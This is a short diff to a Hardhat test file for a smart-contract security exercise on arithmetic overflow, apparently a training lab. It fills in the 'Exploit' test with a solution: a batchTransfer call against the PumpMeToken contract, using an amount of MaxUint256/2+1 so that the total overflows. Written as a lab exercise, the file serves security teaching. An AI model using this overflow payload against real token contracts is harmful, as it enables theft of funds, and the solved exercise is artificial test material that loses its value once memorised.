@@ -10,6 +10,8 @@ describe("Arithmetic Over/Underflow Exercise 4", function () {
 
     const INITIAL_SUPPLY = parseEther("1000000");
 
+    const MAX_INT = ethers.constants.MaxUint256;
+
     let token: PumpMeToken;
 
     before(async function () {
@@ -32,6 +34,7 @@ describe("Arithmetic Over/Underflow Exercise 4", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(attacker).batchTransfer([attacker.address, deployer.address], MAX_INT.div(2).add(1));
     });
 
     after(async function () {
